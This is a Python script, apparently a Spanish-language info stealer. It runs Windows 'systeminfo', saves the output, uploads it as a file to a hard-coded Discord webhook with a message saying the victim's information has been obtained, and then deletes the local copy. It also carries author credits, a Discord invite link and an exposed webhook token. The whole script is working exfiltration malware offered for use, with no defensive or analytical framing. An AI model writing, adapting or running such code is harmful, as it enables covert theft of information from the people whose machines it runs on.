from discord_webhook import DiscordWebhook, DiscordEmbed
from subprocess import check_output
import subprocess
import os

a = check_output('systeminfo',stderr=subprocess.STDOUT)

f = open('Windows_log.txt','wb')
f.write(a)
f.close()

webhook = DiscordWebhook(url='https://discord.com/api/webhooks/1029476201493958797/vR2135ipqqFNX4nKlRDSPhZ1iA7ReYn2Gvle_o8UscGpr7B6WhngBBrXwE58eIhOrwyG')

def credits():
    embed = DiscordEmbed(title='Creditos: ', description='Tito Delas', color=0x03b2f8)
    embed.add_embed_field(name="Discord", value="✞ Tito Delas ✞#8910")
    embed.add_embed_field(name=' ', value="https://discord.gg/mHG3WyEDP9")
    webhook.add_embed(embed)
    webhook.execute(credits)

def embedt():
    embed = DiscordEmbed(title='INFO', description='Se ha obtenido la info de la víctima 🡻', color=0x03b2f8)
    webhook.add_embed(embed)
    webhook.execute(embedt)

def txt():
    path = os.getcwd()
    paths = path + r"\Windows_log.txt"
    with open(paths, "rb") as f:
        webhook.add_file(file=f.read(), filename='info.txt')
    webhook.execute(txt)
    os.remove("Windows_log.txt")

credits()
embedt()
txt()